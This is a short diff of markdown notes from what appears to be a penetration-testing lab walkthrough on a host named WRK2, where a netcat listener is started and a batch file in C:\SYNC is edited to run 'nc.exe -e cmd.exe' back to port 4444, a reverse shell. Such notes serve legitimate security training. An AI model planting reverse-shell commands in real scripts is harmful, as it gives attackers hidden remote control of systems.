@@ -1,5 +1,5 @@
 ## Connect to WRK2
-- RDP to WRK2
+- [[Connect to WRK2 via RDP]]
 - Open a command shell.
 - Look at the "C:\Users\laura.wood\Downloads>" directory.
 - There's a nc.exe file. (Netcat)
@@ -77,6 +77,8 @@ nc -lnvp 4444
 listening on [any] 4444 ...
 
 ## Edit the sync.bat file
+
+Path: C:\SYNC
 
 Add the following code:
 `C:\Users\laura.wood\Downloads\nc.exe -e cmd.exe 127.0.0.1 4444`
